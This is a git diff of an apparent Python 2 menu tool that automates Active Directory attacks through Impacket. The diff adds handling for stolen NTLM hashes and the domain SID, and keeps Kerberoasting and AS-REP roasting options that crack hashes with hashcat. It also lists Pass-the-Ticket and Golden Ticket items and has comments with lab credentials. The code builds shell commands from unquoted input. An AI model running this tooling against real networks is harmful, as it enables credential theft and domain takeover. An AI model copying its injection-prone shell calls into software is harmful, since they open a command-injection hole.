@@ -148,11 +148,11 @@ def display():
    print colored(PA[3],'blue'),
    print u'\u2551'
 
-   print u'\u2551' + " FOREST NAME  " + u'\u2502',
+   print u'\u2551' + " NTLM HASH    " + u'\u2502',
    if FRST == "EMPTY              ":
-      print colored(FRST[:20],'yellow'),
+      print colored(FRST[:19],'yellow'),
    else:
-      print colored(FRST[:20],'blue'),
+      print colored(FRST[:19],'red'),
    print u'\u2551',
    print colored(SH4,'blue'),
    print colored(SHA4,'blue'),
@@ -174,11 +174,11 @@ def display():
    print colored(PA[5],'blue'),
    print u'\u2551'
 
-   print u'\u2551' + " WORKGROUP    " + u'\u2502',
+   print u'\u2551' + " DOMAIN SID   " + u'\u2502',
    if WGRP == "EMPTY              ":
-      print colored(WGRP[:20],'yellow'),
+      print colored(WGRP[:19],'yellow'),
    else:
-      print colored(WGRP[:20],'blue'),
+      print colored(WGRP[:19],'red'),
    print u'\u2551',
    print colored(SH6,'blue'),
    print colored(SHA6,'blue'),
@@ -259,20 +259,20 @@ def display():
 
 # ----------------------------------------------------------------------------------------------------------------------------------------------------
 
-   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) GetArch  (30) Enum4Linux     (40) TGT Creation    (50) Domain Dump  (60) FTP    " + u'\u2551'
-   print u'\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) NetView  (31) WinDapSearch   (41) TGT IMPERSONATE (51) BLOODHOUND   (61) SSH    " + u'\u2551'
-   print u'\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) Services (32) LookupSid      (42) PAC IMPERSONATE (52) ACLPWN       (62) TelNet " + u'\u2551'
-   print u'\u2551' + "(3) Re/Set USERNAME    (13) Check Connection   (23) AtExec   (33) SamDump Users  (43) GOLDEN PAC      (53) SecretsDump  (63) NetCat " + u'\u2551'
-   print u'\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) RpcDump        (44)                 (54) CrackMapExec (64) WinRem " + u'\u2551'
-   print u'\u2551' + "(5) Re/Set FOREST NAME (15) Check DNS SERVER   (25) PsExec   (35) REGistery      (45) UserMailAddress (55) WmiExec HASH (65)        " + u'\u2551'
-   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) SmbExec  (36) SmbClient      (46) KerbeFiltUsers  (56)              (66)        " + u'\u2551'
-   print u'\u2551' + "(7) Re/Set WORK GROUP  (17) Nmap Subdomains    (27) WmiExec  (37) SmbMap SHARE   (47) KerbeStatUsers  (57)              (67)        " + u'\u2551'
-   print u'\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) IfMap    (38) SmbMount SHARE (48) KerbeRoasting   (58)              (68)        " + u'\u2551'
-   print u'\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) OpDump   (39) Rpc Client     (49) KerbeASREPRoast (59)              (69)        " + u'\u2551'
+   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) Get Arch (30) Enum 4 Linux   (40) Kerb Addresses  (50) Domain Dump  (60) FTP    " + u'\u2551'
+   print u'\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) BLOODHOUND   (61) SSH    " + u'\u2551'
+   print u'\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) ACLPWN       (62) TelNet " + u'\u2551'
+   print u'\u2551' + "(3) Re/Set USERNAME    (13) Check Connection   (23) AtExec   (33) SamDump Users  (43) Kerb Roasting   (53) Secrets Dump (63) NetCat " + u'\u2551'
+   print u'\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) RpcDump        (44) Kerb ASREPRoast (54) CrackMapExec (64) WinRem " + u'\u2551'
+   print u'\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER   (25) PsExec   (35) REGistery      (45)                 (55) WmiExec HASH (65)        " + u'\u2551'
+   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) SmbExec  (36) Smb Client     (46) Pass-the-Key    (56)              (66)        " + u'\u2551'
+   print u'\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Subdomains    (27) WmiExec  (37) SmbMap SHARE   (47) Pass-the-Ticket (57)              (67)        " + u'\u2551'
+   print u'\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58)              (68)        " + u'\u2551'
+   print u'\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) OpDump   (39) Rpc Client     (49) Gold Ticket     (59)              (69)        " + u'\u2551'
    print u'\u255A' + (u'\u2550')*132 + u'\u255D'
 
 # -------------------------------------------------------------------------------------
-# AUTHOR  : Terence Broadbent                                                    
+# AUTHOR  : Terence BroadbentAdres                                                    
 # CONTRACT: GitHub
 # Version : 1.0                                                                
 # Details : Display universal header.
@@ -391,9 +391,9 @@ if not os.path.exists('config.txt'):
    TIP  = "EMPTY              " # REMOTE IP
    USR  = '""                 ' # USERNAME
    PAS  = '""                 ' # PASSWORD       
-   FRST = "EMPTY              " # FOREST NAME    
+   FRST = "EMPTY              " # NTML HASH
    HST  = "EMPTY              " # DOMAIN NAME
-   WGRP = "EMPTY              " # WORK GROUP
+   WGRP = "EMPTY              " # DOMAIN SID
    HIP  = "EMPTY              " # CURRENT SHARE
    POR  = "Administrator      " # IMPERSONATE
    PRM  = "'dir -FORCE'       " # WIN COMMAND                                            
@@ -418,9 +418,11 @@ else:
    TIP  = padding(TIP,  COL1)
    USR  = padding(USR,  COL1)
    PAS  = padding(PAS,  COL1)
-   FRST = padding(FRST, COL1)
+   if FRST[:5] == "EMPTY":
+      FRST = padding(FRST, COL1)
    HST  = padding(HST,  COL1)
-   WGRP = padding(WGRP, COL1)
+   if WGRP[:5] == "EMPTY":
+       WGRP = padding(WGRP, COL1)
    HIP  = padding(HIP,  COL1)
    POR  = padding(POR,  COL1)
    PRM  = padding(PRM,  COL1)
@@ -468,9 +470,9 @@ while True:
          os.system("echo '\"\"' >> config.txt")
       else:
          os.system("echo " + PAS  + " >> config.txt")
-      os.system("echo " + FRST + " >> config.txt") 
+      os.system("echo " + FRST.rstrip("\n") + " >> config.txt") 
       os.system("echo " + HST  + " >> config.txt")  
-      os.system("echo " + WGRP + " >> config.txt") 
+      os.system("echo " + WGRP.rstrip("\n") + " >> config.txt")
       os.system("echo " + HIP  + " >> config.txt")  
       os.system("echo " + POR  + " >> config.txt")  
       tmp = '\"' + PRM.rstrip(" ") + '\"'
@@ -533,6 +535,10 @@ while True:
          USR = BAK      
       else:
          USR = padding(USR, COL1)
+      
+      for a in range(0, MAX):
+         if US[a].rstrip(" ") == USR.rstrip(" "):
+            FRST = PA[a]	# UPDATE HASH VALUE TO MATCH USER
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -560,11 +566,9 @@ while True:
 
    if selection == '5':
       BAK = FRST
-      FRST = raw_input("Please enter FOREST name: ")
+      FRST = raw_input("Please enter HASH value: ")
       if FRST == "":
          FRST = BAK      
-      else:
-         FRST = padding(FRST, COL1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -599,11 +603,9 @@ while True:
 
    if selection == '7':
       BAK = WGRP
-      WGRP = raw_input("Please enter WORKGROUP name: ")
+      WGRP = raw_input("Please enter DOMAIN SID value: ")
       if WGRP == "":
          WGRP = BAK      
-      else:
-         WGRP = padding(WGRP, COL1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1003,7 +1005,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='32':
-      command(PRO + "lookupsid.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
+      os.system(PRO + "lookupsid.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> DOMAIN.tmp")
+      command("cat DOMAIN.tmp")
+      os.system("cat DOMAIN.tmp | grep 'Domain SID' >> SID.tmp")
+      os.remove("DOMAIN.tmp")
+      DOMSID = linecache.getline("SID.tmp", 1)
+      os.remove("SID.tmp")
+      WGRP = DOMSID.replace('[*] Domain SID is: ',"")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1114,67 +1122,11 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '40':
-      command(PRO + "getTGT.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
-# Details : Menu option selected - getST.py -impersonate Administrator -spn cifs/megabank.local megabank.local/melanie:Welcome123!
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '41':
-      temp = USR.rstrip(" ") + ".ccache"
-      command(PRO + "getST.py -spn " + temp + " -impersonate " + POR.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
-# Details : Menu option selected - getPac.py -targetUser Administrator htb.local/svc-alfresco:s3rvice
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '42':
-      command(PRO + "getPac.py -targetUser " + POR.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
-# Details : Menu option selected - goldenPac.py -dc-ip 10.10.10.161 -target-ip 10.10.10.161 htb.local/svc-alfresco:s3rvice@htb.local
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '43':
-      command(PRO + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + HST.rstrip(" "))
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='44':
-      exit(1)
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
 # Details : Menu option selected - GetADUsers.py megabank.local/ryan:Serv3r4Admin4cc123! 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '45':
+   if selection == '40':
       command(PRO + "GetADUsers.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
@@ -1185,7 +1137,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '46':
+   if selection == '41':
       print "\nPlease wait..."
       os.system("nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=users.txt " + TIP.rstrip(" ") + " >> KUSERS.tmp")
       os.system("sed -i '/@/!d' KUSERS.tmp")
@@ -1224,7 +1176,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='47':
+   if selection =='42':
       command(PRO + "kerbrute.py -domain " + HST.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt")
 
 # ------------------------------------------------------------------------------------- 
@@ -1235,7 +1187,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '48':
+   if selection == '43':
       if linecache.getline('users.txt', 1) != "":
          command(PRO + "GetUserSPNs.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -outputfile hashes.kerberoast")
          command("hashcat -m 13100 --force -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt -o cracked.txt")
@@ -1251,13 +1203,68 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='49':
+   if selection =='44':
       if linecache.getline('users.txt', 1) != "":
          command(PRO + "GetNPUsers.py -outputfile hashroast.txt -format hashcat " + HST.rstrip(" ") + "/ -usersfile users.txt")
          command("hashcat -m 18200 --force -a 0 hashroast.txt /usr/share/wordlists/rockyou.txt -o cracked.txt")
          command("strings cracked.txt")
       else:
-         command("echo 'The file users.txt is empty?...'")      
+         command("echo 'The file users.txt is empty?...'")   
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : 1.0
+# Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '45':
+      exit(1) 
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : 1.0
+# Details : Menu option selected - 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '46':
+      exit(1)
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : 1.0
+# Details : Menu option selected - getST.py -impersonate Administrator -spn cifs/megabank.local megabank.local/melanie:Welcome123!
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '47':
+      exit(1)      
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : 1.0
+# Details : Menu option selected - 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '48':
+      exit(1)
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : 1.0
+# Details : Menu option selected - 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '49':
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1319,12 +1326,17 @@ while True:
          temp = HST.rstrip(" ") + "\\"
          test = test.replace(temp,"")
          get1,get2,get3,get4 = test.split(":")
-         get1 = padding(get1,COL3) # USER
-         get4 = padding(get4,COL4) # PASSWORD
+         get1 = padding(get1,COL3) 	# USER
+         get4 = padding(get4,COL4) 	# PASSWORD
 
          for y in range (0, MAX):
             if US[y] == get1:
                PA[y] = get4
+
+      for z in range(0, MAX):
+         if US[z].rstrip(" ") == USR.rstrip(" "):
+            FRST = PA[z]		# HASH 
+#          FRST = FRST.rstrip("\n","")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
